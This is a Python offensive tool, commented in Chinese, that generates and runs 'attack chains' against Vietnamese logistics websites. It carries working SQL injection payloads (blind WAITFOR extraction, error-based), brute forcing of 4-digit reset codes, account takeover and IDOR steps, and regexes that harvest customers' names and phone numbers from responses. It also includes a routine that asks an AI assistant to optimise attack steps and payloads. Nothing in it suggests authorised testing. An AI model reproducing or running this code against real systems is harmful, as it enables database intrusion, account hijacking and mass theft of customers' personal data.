"""
业务入口点与链式攻击生成器
专门构建针对越南物流系统的业务逻辑渗透攻击链
"""

import asyncio
import json
import time
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass, field
from enum import Enum
from abc import ABC, abstractmethod
import aiohttp
import logging
import re

class AttackChainType(Enum):
    """攻击链类型枚举"""
    TRACKING_TO_DB = "tracking_to_database"
    PASSWORD_RESET_TO_ACCOUNT = "password_reset_to_account"
    ORDER_MANIPULATION = "order_manipulation"
    CUSTOMER_DATA_EXFIL = "customer_data_exfiltration"
    PAYMENT_BYPASS = "payment_bypass"

class AttackStepStatus(Enum):
    """攻击步骤状态枚举"""
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    SKIPPED = "skipped"

class VulnerabilityType(Enum):
    """漏洞类型枚举"""
    TIME_BASED_SQLI = "time_based_sql_injection"
    ERROR_BASED_SQLI = "error_based_sql_injection"
    UNION_SQLI = "union_sql_injection"
    LOGIC_FLAW = "logic_flaw"
    INSECURE_DIRECT_OBJECT_REFERENCE = "insecure_direct_object_reference"
    MISSING_AUTHENTICATION = "missing_authentication"
    WEAK_PASSWORD_POLICY = "weak_password_policy"

@dataclass
class AttackStep:
    """攻击步骤"""
    step_id: str
    name: str
    action: str
    target: str
    payload: Optional[str] = None
    expected_result: Optional[str] = None
    status: AttackStepStatus = AttackStepStatus.PENDING
    result: Optional[Dict[str, Any]] = None
    error_message: Optional[str] = None
    execution_time: Optional[float] = None

@dataclass
class AttackChain:
    """攻击链"""
    chain_id: str
    chain_type: AttackChainType
    name: str
    description: str
    target_endpoint: str
    steps: List[AttackStep] = field(default_factory=list)
    status: AttackStepStatus = AttackStepStatus.PENDING
    total_execution_time: Optional[float] = None
    success: bool = False
    extracted_data: List[Dict[str, Any]] = field(default_factory=list)

class AttackVector(ABC):
    """攻击向量抽象基类"""

    @abstractmethod
    async def generate_payload(self, context: Dict[str, Any]) -> str:
        """生成攻击载荷"""
        pass

    @abstractmethod
    async def execute(self, session: aiohttp.ClientSession, target: str, payload: str) -> Dict[str, Any]:
        """执行攻击"""
        pass

class SQLInjectionVector(AttackVector):
    """SQL注入攻击向量"""

    def __init__(self):
        self.base_payloads = {
            VulnerabilityType.TIME_BASED_SQLI: [
                "'; WAITFOR DELAY '0:0:{delay}' --",
                "' OR 1=1 WAITFOR DELAY '0:0:{delay}' --",
                "'; IF (ASCII(SUBSTRING((SELECT TOP 1 {column} FROM {table}), {pos}, 1)) > {ascii_val}) WAITFOR DELAY '0:0:2' ELSE WAITFOR DELAY '0:0:0' --"
            ],
            VulnerabilityType.ERROR_BASED_SQLI: [
                "' AND 1=CONVERT(int, (SELECT TOP 1 {column} FROM {table}))--",
                "' AND 1=(SELECT 1 FROM {table} WHERE {column}='{value}')--",
                "' OR 1=1 HAVING 1=1--"
            ]
        }

    async def generate_payload(self, context: Dict[str, Any]) -> str:
        """生成SQL注入载荷"""
        vuln_type = context.get('vulnerability_type', VulnerabilityType.TIME_BASED_SQLI)

        if vuln_type == VulnerabilityType.TIME_BASED_SQLI:
            # 时间盲注payload
            delay = context.get('delay', 2)
            column = context.get('column', 'MaDon')
            table = context.get('table', 'DONHANG')
            pos = context.get('pos', 1)
            ascii_val = context.get('ascii_val', 65)

            payload = self.base_payloads[vuln_type][0].format(
                delay=delay, column=column, table=table, pos=pos, ascii_val=ascii_val
            )
            return f"'{payload}"

        elif vuln_type == VulnerabilityType.ERROR_BASED_SQLI:
            # 错误消息注入payload
            column = context.get('column', 'MaDon')
            table = context.get('table', 'DONHANG')
            value = context.get('value', 'test')

            payload = self.base_payloads[vuln_type][0].format(
                column=column, table=table, value=value
            )
            return payload

        return f"' AND 1=1--"

    async def execute(self, session: aiohttp.ClientSession, target: str, payload: str) -> Dict[str, Any]:
        """执行SQL注入攻击"""
        try:
            start_time = time.time()

            # 根据目标类型选择请求方法
            if target.endswith('.aspx'):
                # ASP.NET通常使用POST
                data = {"MaDonHang": payload, "submit": "Track"}
                response = await session.post(target, data=data, timeout=10)
            else:
                # 其他类型的API
                params = {"tracking_id": payload}
                response = await session.get(target, params=params, timeout=10)

            response_time = time.time() - start_time

            content = await response.text()
            headers = dict(response.headers)

            # 分析响应
            result = {
                "success": response.status < 500,
                "response_time": response_time,
                "content_length": len(content),
                "contains_error": any(error in content.lower() for error in [
                    "sql syntax", "mysql", "postgresql", "sql server", "ora-00936"
                ]),
                "status_code": response.status,
                "headers": headers
            }

            return result

        except Exception as e:
            return {"success": False, "error": str(e)}

class LogicFlawVector(AttackVector):
    """逻辑缺陷攻击向量"""

    async def generate_payload(self, context: Dict[str, Any]) -> str:
        """生成逻辑缺陷载荷"""
        flaw_type = context.get('flaw_type', 'brute_force')

        if flaw_type == 'brute_force':
            # 针对越南4位数字验证码的爆破
            return "0000"  # 简化示例，实际会生成字典

        elif flaw_type == 'id_manipulation':
            # ID篡改payload
            return "999999"  # 尝试超大ID

        return "test_value"

    async def execute(self, session: aiohttp.ClientSession, target: str, payload: str) -> Dict[str, Any]:
        """执行逻辑缺陷攻击"""
        try:
            start_time = time.time()

            if 'reset' in target.lower():
                # 密码重置场景
                data = {"username": payload, "email": payload}
                response = await session.post(target, data=data, timeout=10)
            else:
                # ID篡改场景
                params = {"id": payload}
                response = await session.get(target, params=params, timeout=10)

            response_time = time.time() - start_time

            content = await response.text()

            return {
                "success": response.status == 200,
                "response_time": response_time,
                "content": content,
                "is_redirect": response.status in [302, 301],
                "contains_data": "成功" in content or "success" in content.lower()
            }

        except Exception as e:
            return {"success": False, "error": str(e)}

class AttackChainer:
    """攻击链生成器和管理器"""

    def __init__(self, ai_assistant=None):
        self.ai_assistant = ai_assistant
        self.attack_vectors = {
            VulnerabilityType.TIME_BASED_SQLI: SQLInjectionVector(),
            VulnerabilityType.ERROR_BASED_SQLI: SQLInjectionVector(),
            VulnerabilityType.UNION_SQLI: SQLInjectionVector(),
            VulnerabilityType.LOGIC_FLAW: LogicFlawVector(),
            VulnerabilityType.INSECURE_DIRECT_OBJECT_REFERENCE: LogicFlawVector()
        }
        self.logger = logging.getLogger(__name__)

    async def generate_attack_chain(self, fingerprint_result: Dict[str, Any]) -> AttackChain:
        """基于指纹识别结果生成攻击链"""
        self.logger.info("开始生成业务逻辑攻击链...")

        # 根据业务类型选择攻击链
        business_type = fingerprint_result.get('business_type')
        endpoints = fingerprint_result.get('endpoints', {})

        # 选择最合适的攻击链类型
        if endpoints.get('tracking'):
            chain = await self._generate_tracking_chain(endpoints['tracking'][0])
        elif endpoints.get('customer'):
            chain = await self._generate_customer_chain(endpoints['customer'][0])
        else:
            chain = await self._generate_generic_chain(endpoints)

        # 使用AI优化攻击链
        if self.ai_assistant:
            chain = await self._optimize_chain_with_ai(chain, fingerprint_result)

        self.logger.info(f"生成攻击链: {chain.name} (包含 {len(chain.steps)} 个步骤)")
        return chain

    async def _generate_tracking_chain(self, tracking_endpoint: str) -> AttackChain:
        """生成订单追踪到数据库的攻击链"""
        chain_id = f"tracking_chain_{int(time.time())}"

        steps = [
            AttackStep(
                step_id="1",
                name="时间盲注检测",
                action="sqli_injection",
                target=tracking_endpoint,
                payload="'; WAITFOR DELAY '0:0:2' --",
                expected_result="检测到2秒延迟响应"
            ),
            AttackStep(
                step_id="2",
                name="提取真实订单号",
                action="sqli_extraction",
                target=tracking_endpoint,
                payload="'; SELECT TOP 1 MaDon FROM DONHANG --",
                expected_result="获取到真实的订单ID"
            ),
            AttackStep(
                step_id="3",
                name="滥用API接口",
                action="api_abuse",
                target=tracking_endpoint.replace('Tracking', 'api/orders'),
                payload="提取的订单号",
                expected_result="获取完整订单详情"
            ),
            AttackStep(
                step_id="4",
                name="解析客户信息",
                action="data_extraction",
                target="订单详情响应",
                payload="客户姓名、电话、地址",
                expected_result="获取客户PII数据"
            ),
            AttackStep(
                step_id="5",
                name="数据库武器化",
                action="database_weaponization",
                target="KHACHHANG表",
                payload="SELECT * FROM KHACHHANG",
                expected_result="批量导出客户数据"
            )
        ]

        return AttackChain(
            chain_id=chain_id,
            chain_type=AttackChainType.TRACKING_TO_DB,
            name="订单追踪 → 数据库渗透链",
            description="通过订单追踪功能逐步渗透数据库",
            target_endpoint=tracking_endpoint,
            steps=steps
        )

    async def _generate_customer_chain(self, customer_endpoint: str) -> AttackChain:
        """生成客户账号相关的攻击链"""
        chain_id = f"customer_chain_{int(time.time())}"

        steps = [
            AttackStep(
                step_id="1",
                name="密码重置逻辑检测",
                action="logic_flaw_test",
                target=customer_endpoint,
                payload="测试用户名不存在时的响应",
                expected_result="检查逻辑漏洞"
            ),
            AttackStep(
                step_id="2",
                name="验证码爆破",
                action="brute_force",
                target=customer_endpoint,
                payload="4位数字验证码",
                expected_result="成功重置密码"
            ),
            AttackStep(
                step_id="3",
                name="账号接管",
                action="account_takeover",
                target=customer_endpoint,
                payload="获取的临时凭证",
                expected_result="成功登录客户账号"
            ),
            AttackStep(
                step_id="4",
                name="信息爬取",
                action="data_crawling",
                target="客户后台",
                payload="爬取历史订单",
                expected_result="获取客户完整历史"
            ),
            AttackStep(
                step_id="5",
                name="横向移动",
                action="horizontal_movement",
                target="企业子账号",
                payload="利用现有权限",
                expected_result="渗透企业内部"
            )
        ]

        return AttackChain(
            chain_id=chain_id,
            chain_type=AttackChainType.PASSWORD_RESET_TO_ACCOUNT,
            name="密码重置 → 账号接管链",
            description="利用密码重置功能进行账号接管",
            target_endpoint=customer_endpoint,
            steps=steps
        )

    async def _generate_generic_chain(self, endpoints: Dict[str, List[str]]) -> AttackChain:
        """生成通用攻击链"""
        chain_id = f"generic_chain_{int(time.time())}"

        steps = [
            AttackStep(
                step_id="1",
                name="通用SQL注入检测",
                action="sqli_detection",
                target=endpoints.get('management', ['/admin'])[0] if endpoints.get('management') else '/',
                payload="' OR 1=1--",
                expected_result="检测SQL注入漏洞"
            ),
            AttackStep(
                step_id="2",
                name="信息泄露扫描",
                action="info_leak_scan",
                target="/",
                payload="扫描配置文件",
                expected_result="获取敏感信息"
            ),
            AttackStep(
                step_id="3",
                name="权限测试",
                action="privilege_escalation",
                target="/admin",
                payload="提升权限测试",
                expected_result="检测权限漏洞"
            )
        ]

        return AttackChain(
            chain_id=chain_id,
            chain_type=AttackChainType.CUSTOMER_DATA_EXFIL,
            name="通用信息泄露链",
            description="通用安全漏洞扫描",
            target_endpoint="/",
            steps=steps
        )

    async def _optimize_chain_with_ai(self, chain: AttackChain, fingerprint: Dict[str, Any]) -> AttackChain:
        """使用AI优化攻击链"""
        try:
            # AI分析指纹并优化攻击路径
            optimization_prompt = f"""
            基于以下指纹信息优化攻击链：
            - 技术栈: {fingerprint.get('technology_stack')}
            - 业务类型: {fingerprint.get('business_type')}
            - 数据库方言: {fingerprint.get('database_dialect')}
            - 端点: {fingerprint.get('endpoints')}

            请优化攻击链的步骤顺序和载荷生成策略。
            """

            if hasattr(self.ai_assistant, 'generate_optimization'):
                optimization = await self.ai_assistant.generate_optimization(optimization_prompt)

                # 应用AI优化
                if 'optimized_steps' in optimization:
                    for i, optimized_step in enumerate(optimization['optimized_steps']):
                        if i < len(chain.steps):
                            chain.steps[i].payload = optimized_step.get('payload')
                            chain.steps[i].expected_result = optimized_step.get('expected_result')

        except Exception as e:
            self.logger.warning(f"AI优化失败: {e}")

        return chain

    async def execute_attack_chain(self, chain: AttackChain, session: aiohttp.ClientSession) -> AttackChain:
        """执行攻击链"""
        self.logger.info(f"开始执行攻击链: {chain.name}")

        chain.status = AttackStepStatus.RUNNING
        start_time = time.time()

        successful_steps = 0

        for step in chain.steps:
            self.logger.info(f"执行步骤 {step.step_id}: {step.name}")

            try:
                step.status = AttackStepStatus.RUNNING
                step_start_time = time.time()

                # 根据步骤类型选择相应的攻击向量
                action_type = self._get_action_type(step.action)
                if action_type in self.attack_vectors:
                    attack_vector = self.attack_vectors[action_type]

                    # 执行攻击
                    result = await attack_vector.execute(session, step.target, step.payload or "")
                else:
                    # 通用HTTP请求
                    result = await self._execute_generic_request(session, step.target, step.payload)

                step.execution_time = time.time() - step_start_time
                step.result = result
                step.status = AttackStepStatus.SUCCESS if result.get('success', False) else AttackStepStatus.FAILED

                if step.status == AttackStepStatus.SUCCESS:
                    successful_steps += 1
                    # 提取数据
                    extracted = await self._extract_data(step, result)
                    if extracted:
                        chain.extracted_data.extend(extracted)

            except Exception as e:
                step.status = AttackStepStatus.FAILED
                step.error_message = str(e)
                self.logger.error(f"步骤 {step.step_id} 执行失败: {e}")

        chain.total_execution_time = time.time() - start_time
        chain.success = successful_steps > 0
        chain.status = AttackStepStatus.SUCCESS if successful_steps > 0 else AttackStepStatus.FAILED

        self.logger.info(f"攻击链执行完成: {successful_steps}/{len(chain.steps)} 步骤成功")
        return chain

    def _get_action_type(self, action: str) -> VulnerabilityType:
        """根据动作类型返回漏洞类型"""
        mapping = {
            "sqli_injection": VulnerabilityType.TIME_BASED_SQLI,
            "sqli_extraction": VulnerabilityType.UNION_SQLI,
            "logic_flaw_test": VulnerabilityType.LOGIC_FLAW,
            "brute_force": VulnerabilityType.WEAK_PASSWORD_POLICY,
            "api_abuse": VulnerabilityType.INSECURE_DIRECT_OBJECT_REFERENCE
        }
        return mapping.get(action, VulnerabilityType.LOGIC_FLAW)

    async def _execute_generic_request(self, session: aiohttp.ClientSession, target: str, payload: Optional[str]) -> Dict[str, Any]:
        """执行通用HTTP请求"""
        try:
            start_time = time.time()

            if payload:
                # POST请求
                data = {"data": payload}
                response = await session.post(target, data=data, timeout=10)
            else:
                # GET请求
                response = await session.get(target, timeout=10)

            response_time = time.time() - start_time

            content = await response.text()

            return {
                "success": response.status < 500,
                "response_time": response_time,
                "status_code": response.status,
                "content_length": len(content),
                "content": content
            }

        except Exception as e:
            return {"success": False, "error": str(e)}

    async def _extract_data(self, step: AttackStep, result: Dict[str, Any]) -> List[Dict[str, Any]]:
        """从攻击结果中提取数据"""
        extracted_data = []

        if step.action in ["sqli_extraction", "data_extraction"]:
            # 提取订单号、客户信息等
            if result.get('success') and 'content' in result:
                content = result['content']

                # 提取订单号
                order_ids = re.findall(r'VP\d+|DH\d+|\d{10,}', content)
                if order_ids:
                    extracted_data.append({
                        "type": "order_id",
                        "data": order_ids,
                        "step": step.step_id,
                        "timestamp": time.time()
                    })

                # 提取越南语姓名
                vietnamese_names = re.findall(r'[Nguyễn|Trần|Lê|Phạm|Huỳnh|Phan|Vũ|Đặng|Bùi|Đỗ] [A-Z][a-z]+ [A-Z][a-z]+', content)
                if vietnamese_names:
                    extracted_data.append({
                        "type": "vietnamese_name",
                        "data": vietnamese_names,
                        "step": step.step_id,
                        "timestamp": time.time()
                    })

                # 提取越南手机号
                vietnamese_phones = re.findall(r'(0[3|5|7|8|9]\d{8})', content)
                if vietnamese_phones:
                    extracted_data.append({
                        "type": "vietnamese_phone",
                        "data": vietnamese_phones,
                        "step": step.step_id,
                        "timestamp": time.time()
                    })

        return extracted_data

    def generate_attack_report(self, chain: AttackChain) -> Dict[str, Any]:
        """生成攻击报告"""
        successful_steps = [step for step in chain.steps if step.status == AttackStepStatus.SUCCESS]
        failed_steps = [step for step in chain.steps if step.status == AttackStepStatus.FAILED]

        return {
            "chain_id": chain.chain_id,
            "chain_type": chain.chain_type.value,
            "name": chain.name,
            "status": chain.status.value,
            "success": chain.success,
            "total_steps": len(chain.steps),
            "successful_steps": len(successful_steps),
            "failed_steps": len(failed_steps),
            "success_rate": len(successful_steps) / len(chain.steps) if chain.steps else 0,
            "execution_time": chain.total_execution_time,
            "extracted_data": chain.extracted_data,
            "steps": [
                {
                    "step_id": step.step_id,
                    "name": step.name,
                    "action": step.action,
                    "status": step.status.value,
                    "execution_time": step.execution_time,
                    "success": step.result.get('success', False) if step.result else False
                }
                for step in chain.steps
            ]
        }